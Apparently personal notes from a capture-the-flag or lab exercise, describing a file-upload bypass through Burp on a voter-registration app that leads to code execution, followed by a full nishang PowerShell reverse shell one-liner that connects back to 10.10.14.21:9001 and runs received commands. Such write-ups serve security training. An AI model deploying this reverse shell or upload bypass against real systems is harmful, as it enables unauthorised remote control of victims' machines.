# Getting a Shell
* Add new Voter, upload a random image to get the metadata and send to burp
![[Pasted image 20211226123058.png]]


* Change filename and data
![[Pasted image 20211226123230.png]]



![[Pasted image 20211226124715.png]]


* Gives a redirect, see the link location of profile image to see where is saved our file
![[Pasted image 20211226124030.png]]


### RCE
![[Pasted image 20211226124631.png]]


### Using nishang to get a reverse shell

![[Pasted image 20211226125444.png]]


Content of nishang/eris.ps1
``` bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![[Pasted image 20211226125603.png]]